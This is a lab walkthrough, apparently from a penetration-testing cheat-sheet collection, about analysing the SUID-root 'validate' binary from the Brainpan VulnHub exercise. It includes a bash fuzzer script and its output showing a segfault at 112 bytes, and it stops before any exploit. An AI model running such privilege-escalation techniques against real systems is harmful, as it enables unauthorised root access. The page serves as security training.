# Local Buffer Overflow
Have you found a Linux ELF binary that shows signs of homebrew and is SUID to root? Let's analyze the `/usr/local/bin/validate` file from the Brainpan lab exercise from VulnHUB.com

## Bring it on Home
First, we need to bring the binary back to our attacker machine for analysis. We can do so two different ways that are descibed in the [Data Exfiltration Infiltration](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/data-exfiltration-infiltration.md) cheat sheet in the Grimoire. We do this so that we can easilt analyze the binary using forensics tools that the compromised host might not have installed. 

Ensure that the binary was successfully transferred without corruption by using the `md5sum` command on the binary at the compromised Target system and compare it to the md5sum of the binary on your local Attacker machine.
```
root@attacker-machine:~# md5sum validate
9e7865f1e663529db5d8b1ecb7118490  validate
```
```
user@target-machine:~$ md5sum validate
9e7865f1e663529db5d8b1ecb7118490  validate
```
## File Command
The #1 step for binary analysis on our Attacker system is to run the `file` command. The output of this command is valuable in ensuring,
1. What type of file we have, in our case ELF 32-bit
2. Which libraries/interpreters are required for the binary to execute, in our case was , `/lib/ld-linux.so.2`

So, to get [`/lib/ld-linux.so.2`](https://packages.debian.org/stretch/libc6-i386) installed on our local Attacker system, we will need the `libc6-i686` package.
```
root@attacker-machine:~# apt install libc6-i386
```
## Strings
The #2 step to analyzing a binary is to use the `strings command`. Strings will prvide us with more clues, in our case we see,
```
usage %s <input>
validating input...
passed.
```
So, we know that the application does handle input.
### Fuzz it
Next, we simply pass the application input in increasing sizes until we get it to Segmentation Fault. I wrote a nice little script that will determnine the buffer size for us below. Simply pass the binary's name, n our case `validate`, as an argument.
```
#!/bin/bash
# Standard In C program fuzzer
# 2019 WeakNet Labs, Douglas Berdeaux
buf="" # this will be the buffer overflow
appname=$1 # pass to me the app name
while [ 1 ]
 do
  buf+="A"
  #printf "[*] buf is now: $buf\n";
  seg=$(./${appname} $buf || echo "0x031337" | egrep "0x031337"| wc -l)
  if [[ "$seg" == "1" ]]
   then
    printf "[!] Segmentation Fault Successful! ($(echo -n $buf|wc -m)) bytes.\n"
    exit;
  fi
done;
```
and the output,
```
root@attacker-machine:~# ./stdin-fuzz.sh validate
[!] Segmentation Fault Successful! (112) bytes.
root@attacker-machine:~#
```
